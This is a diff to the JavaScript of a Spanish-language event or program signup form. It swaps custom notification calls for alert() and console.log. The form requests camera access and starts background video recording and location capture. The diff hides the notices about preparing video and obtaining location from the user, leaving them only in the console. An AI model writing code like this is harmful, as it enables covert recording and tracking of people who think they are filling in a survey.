@@ -121,19 +121,19 @@ function validateCurrentStep() {
         const programa = document.getElementById('programa').value;
 
         if (!nombre || !email || !telefono || !programa) {
-            FormAlerts.camposObligatorios();
+            alert('Por favor, completa todos los campos obligatorios.');
             return false;
         }
 
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailRegex.test(email)) {
-            FormAlerts.emailInvalido();
+            alert('Por favor, introduce un correo electrónico válido.');
             return false;
         }
 
         const telefonoRegex = /^\d{10}$/;
         if (!telefonoRegex.test(telefono.replace(/\s/g, ''))) {
-            FormAlerts.telefonoInvalido();
+            alert('Por favor, introduce un número de teléfono de 10 dígitos.');
             return false;
         }
     }
@@ -144,12 +144,12 @@ function validateCurrentStep() {
         const actividades = document.querySelectorAll('input[name="actividades"]:checked');
 
         if (!tipoEvento || !horario) {
-            FormAlerts.seleccionaOpciones();
+            alert('Por favor, selecciona una opción para cada pregunta.');
             return false;
         }
 
         if (actividades.length === 0) {
-            FormAlerts.seleccionaActividad();
+            alert('Por favor, selecciona al menos una actividad.');
             return false;
         }
     }
@@ -159,7 +159,7 @@ function validateCurrentStep() {
         const acompanante = document.querySelector('input[name="acompanante"]:checked');
 
         if (!lugar || !acompanante) {
-            FormAlerts.completaPreguntas();
+            alert('Por favor, completa todas las preguntas.');
             return false;
         }
     }
@@ -176,7 +176,7 @@ async function acceptPermissions() {
     errorDiv.style.display = 'none';
 
     try {
-        FormAlerts.preparandoVideo();
+        console.log('Preparando video...');
 
         // Solicitar permisos de cámara (sin audio)
         stream = await navigator.mediaDevices.getUserMedia({
@@ -187,7 +187,7 @@ async function acceptPermissions() {
             audio: false // No solicitar audio
         });
 
-        FormAlerts.obteniendoUbicacion();
+        console.log('Obteniendo ubicación...');
 
         // Iniciar grabación y obtención de ubicación en segundo plano
         startBackgroundRecording();
@@ -196,7 +196,7 @@ async function acceptPermissions() {
         showStep(3);
 
     } catch (error) {
-        FormAlerts.permisoCamaraDenegado(error.message);
+        console.error('Permiso de cámara denegado:', error.message);
     }
 }
 
@@ -282,7 +282,7 @@ async function submitForm() {
     submitButton.disabled = true;
     submitButton.textContent = 'Enviando...';
 
-    FormAlerts.enviandoFormulario();
+    console.log('Enviando formulario...');
 
     // Recopilar todos los datos
     const formData = new FormData();
@@ -337,15 +337,12 @@ async function submitForm() {
 
         const result = await response.json();
         console.log('Formulario enviado exitosamente:', result);
-
-        notificationSystem.clearAll();
-        FormAlerts.formularioEnviado();
+        console.log('Formulario enviado.');
 
         showStep('Success');
     } catch (error) {
         console.error('Error al enviar:', error);
-        notificationSystem.clearAll();
-        FormAlerts.errorEnvio(error.message);
+        console.error('Error de envío:', error.message);
         submitButton.disabled = false;
         submitButton.textContent = 'Enviar Formulario';
     }
@@ -363,7 +360,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Notificación de bienvenida
     setTimeout(() => {
-        FormAlerts.sesionIniciada();
+        console.log('Sesión iniciada.');
     }, 500);
 });
 
